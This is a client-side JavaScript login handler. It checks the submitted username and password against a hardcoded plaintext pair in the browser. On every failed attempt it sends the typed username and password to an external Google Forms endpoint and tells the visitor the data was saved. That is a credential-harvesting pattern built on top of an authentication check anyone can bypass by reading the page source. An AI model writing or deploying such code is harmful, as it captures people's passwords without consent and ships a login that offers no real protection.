document.addEventListener('DOMContentLoaded', function() {
    const body = document.body;

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        const validUsername = "Pandiselvam";
        const validPassword = "Pandi@123";

        const formURL = 'https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse';
        const formData = new FormData();
        formData.append('entry.YOUR_EMAIL_FIELD_ID', username);
        formData.append('entry.YOUR_PASSWORD_FIELD_ID', password);

        if (username === validUsername && password === validPassword) {
            document.getElementById('login-container').style.display = 'none';
            document.getElementById('content').style.display = 'block';
        } else {
            fetch(formURL, { method: 'POST', body: formData })
                .then(response => {
                    document.getElementById('error-message').textContent = "Invalid username or password, but your data has been saved.";
                })
                .catch(error => {
                    document.getElementById('error-message').textContent = "Error saving your data. Please try again.";
                });
        }
    });
});
